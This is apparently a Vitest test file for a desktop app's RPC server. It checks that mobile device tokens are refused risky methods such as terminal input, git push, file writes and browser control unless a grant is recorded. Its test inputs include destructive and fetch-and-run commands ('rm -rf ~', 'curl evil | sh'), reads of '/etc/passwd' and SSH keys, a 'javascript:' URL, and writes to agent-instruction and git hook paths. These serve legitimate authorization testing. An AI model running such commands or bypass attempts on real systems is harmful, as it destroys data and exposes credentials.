import { mkdtempSync, readFileSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { EventEmitter } from 'node:events'
import { describe, expect, it, vi, type MockInstance } from 'vitest'
import type { WebSocket } from 'ws'
import { DobiusRuntimeRpcServer, MOBILE_RPC_METHOD_ALLOWLIST } from './runtime-rpc'
import { DeviceRegistry } from './device-registry'
import { DEVICE_REGISTRY_FILENAME } from './mobile-pairing-files'
import { MOBILE_RPC_GRANTS, mobileRpcRequirement } from './mobile-rpc-grants'
import { MOBILE_RPC_METHOD_CLASSES } from './mobile-rpc-method-classes'
import type { DobiusRuntimeService } from './dobius-runtime'
import {
  encodeTerminalStreamFrame,
  encodeTerminalStreamText,
  TerminalStreamOpcode,
  type TerminalStreamFrame
} from '../../shared/terminal-stream-protocol'

class FakeWebSocket extends EventEmitter {
  readonly OPEN = 1
  readyState = 1
}

type StreamingOptions = {
  registerBinaryStreamHandler?: (
    streamId: number,
    handler: (frame: TerminalStreamFrame) => void
  ) => () => void
}

function setup(): {
  server: DobiusRuntimeRpcServer
  registry: DeviceRegistry
  dispatchStreaming: MockInstance<DobiusRuntimeRpcServer['dispatcher']['dispatchStreaming']>
  send: (token: string, method: string, params?: unknown) => Promise<Record<string, unknown>>
} {
  const userDataPath = mkdtempSync(join(tmpdir(), 'dobius-rpc-grants-'))
  const runtime = { getRuntimeId: () => 'test-runtime' } as unknown as DobiusRuntimeService
  const server = new DobiusRuntimeRpcServer({ runtime, userDataPath, enableWebSocket: false })
  const registry = new DeviceRegistry(userDataPath)
  server['deviceRegistry'] = registry
  const dispatchStreaming = vi
    .spyOn(server['dispatcher'], 'dispatchStreaming')
    .mockImplementation(async (request, reply) => {
      reply(JSON.stringify({ id: request.id, ok: true, result: {} }))
    })
  const send = async (
    token: string,
    method: string,
    params?: unknown
  ): Promise<Record<string, unknown>> => {
    const replies: Record<string, unknown>[] = []
    await server['handleWebSocketMessage'](
      JSON.stringify({ id: `req_${method}`, method, deviceToken: token, params }),
      (response) => replies.push(JSON.parse(response) as Record<string, unknown>),
      () => {}
    )
    expect(replies).toHaveLength(1)
    return replies[0]!
  }
  return { server, registry, dispatchStreaming, send }
}

const forbidden = { ok: false, error: expect.objectContaining({ code: 'forbidden' }) }

describe('mobile RPC grants (#18)', () => {
  it('denies terminal.send, git.push, worktree.rm and settings.update to a mobile token without a grant', async () => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')

    for (const method of ['terminal.send', 'git.push', 'worktree.rm', 'settings.update']) {
      await expect(send(phone.token, method, {})).resolves.toMatchObject(forbidden)
    }
    expect(dispatchStreaming).not.toHaveBeenCalled()
  })

  it('still allows ordinary mobile methods without a grant', async () => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')

    await expect(send(phone.token, 'terminal.read', { terminal: 't' })).resolves.toMatchObject({
      ok: true
    })
    await expect(send(phone.token, 'settings.get')).resolves.toMatchObject({ ok: true })
    await expect(
      send(phone.token, 'session.tabs.createTerminal', { worktree: 'id:wt' })
    ).resolves.toMatchObject({ ok: true })
    expect(dispatchStreaming).toHaveBeenCalledTimes(3)
  })

  it('denies terminal creation that carries startup input without the terminal.send grant', async () => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')

    await expect(
      send(phone.token, 'session.tabs.createTerminal', { worktree: 'id:wt', command: 'rm -rf ~' })
    ).resolves.toMatchObject(forbidden)
    await expect(
      send(phone.token, 'terminal.create', { worktree: 'id:wt', env: { A: '1' } })
    ).resolves.toMatchObject(forbidden)
    await expect(
      send(phone.token, 'terminal.create', {
        launchConfig: { agentCommand: 'sh', agentArgs: '-c x', agentEnv: {} }
      })
    ).resolves.toMatchObject(forbidden)
    expect(dispatchStreaming).not.toHaveBeenCalled()
  })

  it('allows each high-risk method only once its grant is recorded on the device', async () => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    registry.getDevice(phone.deviceId)!.grants = ['git.push']

    await expect(send(phone.token, 'git.push', {})).resolves.toMatchObject({ ok: true })
    await expect(send(phone.token, 'terminal.send', {})).resolves.toMatchObject(forbidden)
    expect(dispatchStreaming).toHaveBeenCalledTimes(1)
  })

  it('does not restrict runtime-scoped tokens', async () => {
    const { registry, dispatchStreaming, send } = setup()
    const cli = registry.addDevice('cli', 'runtime')

    for (const method of ['terminal.send', 'git.push', 'worktree.rm', 'settings.update']) {
      await expect(send(cli.token, method, {})).resolves.toMatchObject({ ok: true })
    }
    expect(dispatchStreaming).toHaveBeenCalledTimes(4)
  })

  it('drops binary terminal Input frames from a mobile device without the terminal.send grant', async () => {
    const { server, registry, dispatchStreaming } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    const ws = new FakeWebSocket()
    server['wsConnectionIds'].set(ws as unknown as WebSocket, 'conn-1')
    const onFrame = vi.fn()
    dispatchStreaming.mockImplementation(
      async (_request, _reply, options?: StreamingOptions) => {
        options!.registerBinaryStreamHandler!(1, onFrame)
      }
    )

    await server['handleWebSocketMessage'](
      JSON.stringify({ id: 'req_mux', method: 'terminal.multiplex', deviceToken: phone.token }),
      () => {},
      () => {},
      undefined,
      ws as unknown as WebSocket
    )
    const frame = (opcode: TerminalStreamOpcode): Uint8Array =>
      encodeTerminalStreamFrame({
        opcode,
        streamId: 1,
        seq: 0,
        payload: encodeTerminalStreamText('echo pwned\r')
      })

    server['handleWebSocketBinaryMessage'](frame(TerminalStreamOpcode.Input), ws as never)
    expect(onFrame).not.toHaveBeenCalled()

    // Non-input frames (resize etc.) still reach the stream.
    server['handleWebSocketBinaryMessage'](frame(TerminalStreamOpcode.Resize), ws as never)
    expect(onFrame).toHaveBeenCalledTimes(1)

    registry.getDevice(phone.deviceId)!.grants = ['terminal.send']
    server['handleWebSocketBinaryMessage'](frame(TerminalStreamOpcode.Input), ws as never)
    expect(onFrame).toHaveBeenCalledTimes(2)
    expect(onFrame.mock.calls[1]![0]).toMatchObject({ opcode: TerminalStreamOpcode.Input })
  })

  it('keeps binary terminal Input frames working for runtime-scoped devices', async () => {
    const { server, registry, dispatchStreaming } = setup()
    const cli = registry.addDevice('cli', 'runtime')
    const ws = new FakeWebSocket()
    server['wsConnectionIds'].set(ws as unknown as WebSocket, 'conn-2')
    const onFrame = vi.fn()
    dispatchStreaming.mockImplementation(
      async (_request, _reply, options?: StreamingOptions) => {
        options!.registerBinaryStreamHandler!(1, onFrame)
      }
    )

    await server['handleWebSocketMessage'](
      JSON.stringify({ id: 'req_mux', method: 'terminal.multiplex', deviceToken: cli.token }),
      () => {},
      () => {},
      undefined,
      ws as unknown as WebSocket
    )
    server['handleWebSocketBinaryMessage'](
      encodeTerminalStreamFrame({
        opcode: TerminalStreamOpcode.Input,
        streamId: 1,
        seq: 0,
        payload: encodeTerminalStreamText('ls\r')
      }),
      ws as never
    )
    expect(onFrame).toHaveBeenCalledTimes(1)
  })
})

describe('mobile grant storage', () => {
  it('reads valid grants from the device registry file and ignores unknown ones', () => {
    const userDataPath = mkdtempSync(join(tmpdir(), 'dobius-rpc-grants-'))
    const first = new DeviceRegistry(userDataPath)
    const phone = first.addDevice('phone', 'mobile')
    const filePath = join(userDataPath, DEVICE_REGISTRY_FILENAME)
    const devices = JSON.parse(readFileSync(filePath, 'utf8')) as Record<string, unknown>[]
    devices[0]!.grants = ['terminal.send', 'files.delete', 42]
    writeFileSync(filePath, JSON.stringify(devices))

    const reloaded = new DeviceRegistry(userDataPath).getDevice(phone.deviceId)
    expect(reloaded?.grants).toEqual(['terminal.send'])
  })

  it('treats a malformed grants field as no grants', () => {
    const userDataPath = mkdtempSync(join(tmpdir(), 'dobius-rpc-grants-'))
    const phone = new DeviceRegistry(userDataPath).addDevice('phone', 'mobile')
    const filePath = join(userDataPath, DEVICE_REGISTRY_FILENAME)
    const devices = JSON.parse(readFileSync(filePath, 'utf8')) as Record<string, unknown>[]
    devices[0]!.grants = 'terminal.send'
    writeFileSync(filePath, JSON.stringify(devices))

    const reloaded = new DeviceRegistry(userDataPath).getDevice(phone.deviceId)
    expect(reloaded?.grants).toBeUndefined()
  })

  it('leaves read-only methods and agent-only terminal creation ungated', () => {
    expect(mobileRpcRequirement('git.status', {})).toEqual({ grants: [] })
    expect(mobileRpcRequirement('session.tabs.createTerminal', { worktree: 'id:wt' })).toEqual({
      grants: []
    })
    expect(mobileRpcRequirement('git.generateCommitMessage', { worktree: 'id:wt' })).toEqual({
      grants: []
    })
  })
})

describe('mobile RPC grants: review bypasses', () => {
  const denied = async (method: string, params: unknown): Promise<void> => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    await expect(send(phone.token, method, params)).resolves.toMatchObject(forbidden)
    expect(dispatchStreaming).not.toHaveBeenCalled()
  }

  it('F1: worktree.create needs the worktree.create grant', async () => {
    await denied('worktree.create', { repo: 'id:r', name: 'x' })
  })

  it.each([
    ['startupCommand', { startupCommand: 'curl evil | sh' }],
    ['startupEnv', { startupEnv: { A: '1' } }],
    ['startupLaunchConfig', { startupLaunchConfig: { agentArgs: '', agentEnv: {} } }],
    ['startupAgent + startupPrompt', { startupAgent: 'codex', startupPrompt: 'rm -rf ~' }],
    ['startupDraft', { startupDraft: 'x' }],
    ['setupDecision run', { setupDecision: 'run' }],
    ['runHooks', { runHooks: true }]
  ])(
    'F1: worktree.create with %s also needs terminal.send, even with the create grant',
    async (_label, extra) => {
      const { registry, dispatchStreaming, send } = setup()
      const phone = registry.addDevice('phone', 'mobile')
      registry.getDevice(phone.deviceId)!.grants = ['worktree.create']
      await expect(
        send(phone.token, 'worktree.create', { repo: 'id:r', ...extra })
      ).resolves.toMatchObject(forbidden)
      expect(dispatchStreaming).not.toHaveBeenCalled()

      registry.getDevice(phone.deviceId)!.grants = ['worktree.create', 'terminal.send']
      await expect(
        send(phone.token, 'worktree.create', { repo: 'id:r', ...extra })
      ).resolves.toMatchObject({ ok: true })
    }
  )

  it('F1: worktree.create with only the create grant and setup skipped is allowed', async () => {
    const { registry, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    registry.getDevice(phone.deviceId)!.grants = ['worktree.create']
    await expect(
      send(phone.token, 'worktree.create', { repo: 'id:r', setupDecision: 'skip' })
    ).resolves.toMatchObject({ ok: true })
  })

  it('F2: agentTeams methods are not available to mobile tokens', async () => {
    await denied('agentTeams.tmuxCompat', { args: ['send-keys', '-t', 'x', 'id', 'Enter'] })
    await denied('agentTeams.prepareLaunch', {})
  })

  it.each([
    'commitMessageAi',
    'sourceControlAi',
    'sourceControlAiResolvedParams',
    'agentCmdOverrides'
  ])('F3: AI generation rejects a mobile %s override even with every grant', async (field) => {
    for (const method of [
      'git.generateCommitMessage',
      'git.generatePullRequestFields',
      'git.discoverCommitMessageModels'
    ]) {
      const { registry, dispatchStreaming, send } = setup()
      const phone = registry.addDevice('phone', 'mobile')
      registry.getDevice(phone.deviceId)!.grants = [
        'terminal.send',
        'git.push',
        'git.discard',
        'worktree.create',
        'worktree.rm',
        'settings.update',
        'files.write',
        'remote.merge',
        'remote.write',
        'browser.control'
      ]
      await expect(
        send(phone.token, method, { worktree: 'id:wt', [field]: { custom: 'sh -c x' } })
      ).resolves.toMatchObject(forbidden)
      expect(dispatchStreaming).not.toHaveBeenCalled()
    }
  })

  it.each(['hookSettings', 'sourceControlAi', 'worktreeBasePath', 'symlinkPaths'])(
    'F4: repo.update rejects a mobile %s change',
    async (field) => {
      await denied('repo.update', { repo: 'id:r', updates: { [field]: ['x'] } })
    }
  )

  it('F4: repo.update still allows the issue-source preference the phone uses', async () => {
    const { registry, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    await expect(
      send(phone.token, 'repo.update', { repo: 'id:r', updates: { issueSourcePreference: 'origin' } })
    ).resolves.toMatchObject({ ok: true })
  })

  it.each([
    ['F5', 'git.discard', 'git.discard'],
    ['F6', 'github.mergePR', 'remote.merge'],
    ['F6', 'gitlab.mergeMR', 'remote.merge'],
    ['F6', 'github.setPRAutoMerge', 'remote.merge'],
    ['F6', 'github.updatePRState', 'remote.merge'],
    ['F6', 'gitlab.updateMRState', 'remote.merge'],
    ['F7', 'worktree.forceDeleteBranch', 'worktree.rm'],
    ['F8', 'terminal.close', 'terminal.send'],
    ['sweep', 'files.writeTerminalArtifact', 'files.write'],
    ['sweep', 'session.tabs.close', 'terminal.send'],
    ['sweep', 'worktree.sleep', 'terminal.send'],
    ['R2-F2', 'markdown.saveTab', 'files.write'],
    ['R2-F2', 'files.createFile', 'files.write'],
    ['R2-F4', 'linear.connect', 'settings.update'],
    ['R2-F4', 'linear.selectWorkspace', 'settings.update'],
    ['R2-low', 'git.forkSync', 'git.push'],
    ['R2-F1', 'browser.screencast', 'browser.control'],
    ['R2-F1', 'browser.mouseClick', 'browser.control'],
    ['R2-F1', 'browser.keyboardInsertText', 'browser.control'],
    ['R2-F1', 'browser.reload', 'browser.control'],
    ['R2-F1', 'browser.tabCreate', 'browser.control']
  ] as const)('%s: %s needs the %s grant', async (_id, method, grant) => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    await expect(send(phone.token, method, {})).resolves.toMatchObject(forbidden)
    expect(dispatchStreaming).not.toHaveBeenCalled()
    registry.getDevice(phone.deviceId)!.grants = [grant]
    await expect(send(phone.token, method, {})).resolves.toMatchObject({ ok: true })
  })
})

describe('mobile RPC grants: round-2 review', () => {
  const allGrants = MOBILE_RPC_GRANTS

  const sendWithAllGrants = async (
    method: string,
    params: unknown
  ): Promise<{ reply: Record<string, unknown>; dispatched: boolean }> => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    registry.getDevice(phone.deviceId)!.grants = [...allGrants]
    const reply = await send(phone.token, method, params)
    return { reply, dispatched: dispatchStreaming.mock.calls.length > 0 }
  }

  it.each([
    ['browser.goto', { url: 'file:///etc/passwd' }],
    ['browser.goto', { url: '/Users/me/.ssh/id_ed25519' }],
    ['browser.goto', { url: 'C:\\Users\\me\\secrets.txt' }],
    ['browser.goto', { url: '--help' }],
    ['browser.goto', { url: 'javascript:alert(1)' }],
    ['browser.goto', {}],
    ['browser.tabCreate', { url: 'file:///etc/passwd' }],
    ['browser.tabCreate', { url: '/etc/hosts' }],
    ['browser.tabCreate', { url: '-x' }]
  ])('F1: %s rejects a non-http(s) URL even with every grant (%o)', async (method, params) => {
    const { reply, dispatched } = await sendWithAllGrants(method, params)
    expect(reply).toMatchObject(forbidden)
    expect(dispatched).toBe(false)
  })

  it.each([
    ['browser.goto', { url: 'https://example.com' }],
    ['browser.goto', { url: 'example.com' }],
    ['browser.goto', { url: 'localhost:3000' }],
    ['browser.tabCreate', {}],
    ['browser.tabCreate', { url: 'about:blank' }],
    ['browser.tabCreate', { url: 'http://example.com' }]
  ])('F1: %s allows http(s) with browser.control (%o)', async (method, params) => {
    const { reply, dispatched } = await sendWithAllGrants(method, params)
    expect(reply).toMatchObject({ ok: true })
    expect(dispatched).toBe(true)
  })

  it.each([
    ['files.createFile', { worktree: 'id:wt', relativePath: 'CLAUDE.md' }],
    ['files.createFile', { worktree: 'id:wt', relativePath: 'pkg/AGENTS.md' }],
    ['files.createFile', { worktree: 'id:wt', relativePath: '.claude/settings.json' }],
    ['files.createFile', { worktree: 'id:wt', relativePath: '.codex/config.toml' }],
    ['files.createFile', { worktree: 'id:wt', relativePath: '.git/hooks/pre-commit' }],
    ['files.createFile', { worktree: 'id:wt', relativePath: 'dobius.yaml' }],
    ['files.createFile', { worktree: 'id:wt', relativePath: 'AGENT\u017F.md' }],
    ['files.createFile', { worktree: 'id:wt', relativePath: 'pkg\\package.json' }]
  ])('F2: %s refuses agent-instruction, hook and .git paths even with files.write (%o)', async (method, params) => {
    const { reply, dispatched } = await sendWithAllGrants(method, params)
    expect(reply).toMatchObject(forbidden)
    expect(dispatched).toBe(false)
  })

  it('F2: files.createFile of an ordinary file is allowed with files.write', async () => {
    const { reply } = await sendWithAllGrants('files.createFile', {
      worktree: 'id:wt',
      relativePath: 'src/notes.md'
    })
    expect(reply).toMatchObject({ ok: true })
  })

  it.each([
    ['pushTarget', { remoteName: 'evil', branchName: 'main' }],
    ['parentWorktree', 'id:other']
  ])('F3: worktree.set rejects a mobile %s change even with every grant', async (field, value) => {
    const { reply, dispatched } = await sendWithAllGrants('worktree.set', {
      worktree: 'id:wt',
      [field]: value
    })
    expect(reply).toMatchObject(forbidden)
    expect(dispatched).toBe(false)
  })

  it('F3: worktree.set metadata without those fields still works with no grants', async () => {
    const { registry, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    await expect(
      send(phone.token, 'worktree.set', { worktree: 'id:wt', displayName: 'x' })
    ).resolves.toMatchObject({ ok: true })
  })

  it('leaves screencast cleanup ungated so a phone can always stop streaming', async () => {
    const { registry, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    await expect(send(phone.token, 'browser.screencast.unsubscribe', {})).resolves.toMatchObject({
      ok: true
    })
  })
})

describe('mobile RPC grants: round-3 review (default deny)', () => {
  it('classifies every mobile-allowlisted method, and nothing else', () => {
    const allowlisted = [...MOBILE_RPC_METHOD_ALLOWLIST]
    const unclassified = allowlisted.filter(
      (method) => !Object.hasOwn(MOBILE_RPC_METHOD_CLASSES, method)
    )
    const stale = Object.keys(MOBILE_RPC_METHOD_CLASSES).filter(
      (method) => !MOBILE_RPC_METHOD_ALLOWLIST.has(method)
    )
    expect(unclassified).toEqual([])
    expect(stale).toEqual([])
  })

  it('denies a method that has no classification', () => {
    expect(mobileRpcRequirement('github.someNewWrite', {})).toMatchObject({
      rejected: expect.stringContaining('not classified')
    })
    expect(mobileRpcRequirement('toString', {})).toMatchObject({
      rejected: expect.stringContaining('not classified')
    })
  })

  it.each([
    ['F1', 'github.project.updatePullRequestBySlug', 'remote.merge'],
    ['F3', 'hostedReview.create', 'remote.write'],
    ['F3', 'github.createIssue', 'remote.write'],
    ['F3', 'github.addIssueComment', 'remote.write'],
    ['F3', 'github.addPRReviewComment', 'remote.write'],
    ['F3', 'github.addPRReviewCommentReply', 'remote.write'],
    ['F3', 'github.requestPRReviewers', 'remote.write'],
    ['F3', 'github.rerunPRChecks', 'remote.write'],
    ['F3', 'github.updatePR', 'remote.write'],
    ['F3', 'github.updateIssue', 'remote.write'],
    ['F3', 'github.project.addIssueCommentBySlug', 'remote.write'],
    ['F3', 'github.project.updateIssueCommentBySlug', 'remote.write'],
    ['F3', 'github.project.deleteIssueCommentBySlug', 'remote.write'],
    ['F3', 'github.project.updateIssueBySlug', 'remote.write'],
    ['F3', 'github.project.updateIssueTypeBySlug', 'remote.write'],
    ['F3', 'github.project.updateItemField', 'remote.write'],
    ['F3', 'github.project.clearItemField', 'remote.write'],
    ['F3', 'gitlab.createIssue', 'remote.write'],
    ['F3', 'gitlab.addMRComment', 'remote.write'],
    ['F3', 'gitlab.updateMR', 'remote.write'],
    ['F3', 'linear.createIssue', 'remote.write'],
    ['F3', 'linear.createProject', 'remote.write'],
    ['F3', 'linear.addIssueComment', 'remote.write'],
    ['F3', 'linear.updateIssue', 'remote.write'],
    ['F5', 'git.abortMerge', 'git.discard'],
    ['F5', 'git.abortRebase', 'git.discard']
  ] as const)('%s: %s needs the %s grant', async (_id, method, grant) => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    await expect(send(phone.token, method, {})).resolves.toMatchObject(forbidden)
    expect(dispatchStreaming).not.toHaveBeenCalled()
    registry.getDevice(phone.deviceId)!.grants = [grant]
    await expect(send(phone.token, method, {})).resolves.toMatchObject({ ok: true })
  })

  it.each([
    ['forkSyncMode', 'safe-auto'],
    ['upstream', { owner: 'evil', repo: 'fork' }]
  ])('F4: repo.update rejects a mobile %s change even with every grant', async (field, value) => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    registry.getDevice(phone.deviceId)!.grants = [...MOBILE_RPC_GRANTS]
    await expect(
      send(phone.token, 'repo.update', { repo: 'id:r', updates: { [field]: value } })
    ).resolves.toMatchObject(forbidden)
    expect(dispatchStreaming).not.toHaveBeenCalled()
  })
})

describe('mobile RPC grants: final review', () => {
  it.each(['git.checkout', 'git.pull', 'git.fastForward', 'git.rebaseFromBase'])(
    'F1: %s needs the git.sync grant',
    async (method) => {
      const { registry, dispatchStreaming, send } = setup()
      const phone = registry.addDevice('phone', 'mobile')
      await expect(send(phone.token, method, {})).resolves.toMatchObject(forbidden)
      expect(dispatchStreaming).not.toHaveBeenCalled()
      registry.getDevice(phone.deviceId)!.grants = ['git.sync']
      await expect(send(phone.token, method, {})).resolves.toMatchObject({ ok: true })
    }
  )

  it('F1: git.fetch stays ungated', async () => {
    const { registry, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    await expect(send(phone.token, 'git.fetch', { worktree: 'id:wt' })).resolves.toMatchObject({
      ok: true
    })
  })

  it('F1: worktree.set rejects a mobile baseRef change even with every grant', async () => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    registry.getDevice(phone.deviceId)!.grants = [...MOBILE_RPC_GRANTS]
    await expect(
      send(phone.token, 'worktree.set', { worktree: 'id:wt', baseRef: 'fork/main' })
    ).resolves.toMatchObject(forbidden)
    expect(dispatchStreaming).not.toHaveBeenCalled()
  })

  it.each([
    ['baseBranch', 'fork/evil'],
    ['pushTarget', { remoteName: 'fork', branchName: 'x' }]
  ])('F1: worktree.create with %s also needs git.sync', async (field, value) => {
    const { registry, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    registry.getDevice(phone.deviceId)!.grants = ['worktree.create']
    await expect(
      send(phone.token, 'worktree.create', { repo: 'id:r', [field]: value })
    ).resolves.toMatchObject(forbidden)
    registry.getDevice(phone.deviceId)!.grants = ['worktree.create', 'git.sync']
    await expect(
      send(phone.token, 'worktree.create', { repo: 'id:r', [field]: value })
    ).resolves.toMatchObject({ ok: true })
  })

  it.each([
    ['trustedDobiusHooks', { 'repo-1': { all: true } }],
    ['setupScriptPromptDismissedRepoIds', ['repo-1']],
    ['browserDefaultUrl', 'file:///etc/passwd'],
    ['browserKagiSessionLink', 'https://evil.example'],
    ['customPets', [{ src: 'file:///x' }]],
    ['customSidekicks', [{ src: 'file:///x' }]],
    ['dismissedUpdateVersion', '9.9.9'],
    ['dismissedUpdateNudgeId', 'n'],
    ['pendingUpdateNudgeId', 'n']
  ])('F2: ui.set rejects a mobile %s change even with every grant', async (field, value) => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    registry.getDevice(phone.deviceId)!.grants = [...MOBILE_RPC_GRANTS]
    await expect(send(phone.token, 'ui.set', { [field]: value })).resolves.toMatchObject(forbidden)
    expect(dispatchStreaming).not.toHaveBeenCalled()
  })

  it('F2: ui.set of ordinary view state still works with no grants', async () => {
    const { registry, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    await expect(
      send(phone.token, 'ui.set', { taskResumeState: { linearQuery: 'x' }, sortBy: 'recent' })
    ).resolves.toMatchObject({ ok: true })
  })

  it.each([
    ['session.tabs.createTerminal', { worktree: 'id:wt', agent: 'codex' }],
    ['terminal.create', { worktree: 'id:wt', launchAgent: 'claude' }],
    ['terminal.create', { worktree: 'id:wt', launchToken: 't' }]
  ])('F3: %s starting an agent needs terminal.send (%o)', async (method, params) => {
    const { registry, dispatchStreaming, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    await expect(send(phone.token, method, params)).resolves.toMatchObject(forbidden)
    expect(dispatchStreaming).not.toHaveBeenCalled()
    registry.getDevice(phone.deviceId)!.grants = ['terminal.send']
    await expect(send(phone.token, method, params)).resolves.toMatchObject({ ok: true })
  })

  it('worktree.activate that the desktop would act on (agent resume) needs terminal.send', async () => {
    const { registry, send } = setup()
    const phone = registry.addDevice('phone', 'mobile')
    await expect(send(phone.token, 'worktree.activate', { worktree: 'id:wt' })).resolves.toMatchObject(
      forbidden
    )
    await expect(
      send(phone.token, 'worktree.activate', { worktree: 'id:wt', notifyClients: true })
    ).resolves.toMatchObject(forbidden)
    await expect(
      send(phone.token, 'worktree.activate', { worktree: 'id:wt', notifyClients: false })
    ).resolves.toMatchObject({ ok: true })
  })
})
